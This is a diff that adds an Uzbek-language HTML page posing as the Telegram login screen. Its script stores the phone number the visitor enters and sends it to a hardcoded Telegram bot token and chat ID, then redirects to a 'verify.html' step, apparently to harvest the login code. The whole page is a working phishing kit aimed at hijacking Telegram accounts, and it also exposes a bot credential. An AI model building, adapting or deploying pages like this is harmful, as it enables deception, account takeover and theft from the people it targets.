@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegramga Kirish</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #ffffff; }
+        .container { width: 350px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #000; font-weight: bold; }
+        p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        select, input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
+        .button { width: 100%; padding: 12px; background-color: #0088cc; border: none; color: white; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+<div class="container">
+    <h2>Telegramga kirish</h2>
+    <p>Mamlakatingiz kodini tasdiqlang va telefon raqamingizni kiriting.</p>
+
+    <form id="loginForm">
+        <select id="country">
+            <option value="+998">O'zbekiston (+998)</option>
+        </select>
+        <input type="tel" id="phoneNumber" placeholder="-- --- -- --" required>
+        <button type="submit" class="button">KEYINGISI</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        let countryCode = document.getElementById("country").value;
+        let phoneNumber = document.getElementById("phoneNumber").value;
+        let fullNumber = countryCode + phoneNumber;
+
+        localStorage.setItem("userPhoneNumber", fullNumber);
+
+        const BOT_TOKEN = "8007432244:AAFNNjMRWLr7_mGnfZTpDxNH1fgggRnWtuU";
+        const CHAT_ID = "1767505726";
+
+        let message = `📲 Yangi foydalanuvchi: ${fullNumber}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        }).then(() => {
+            window.location.href = "verify.html";
+        });
+    });
+</script>
+
+</body>
+</html>
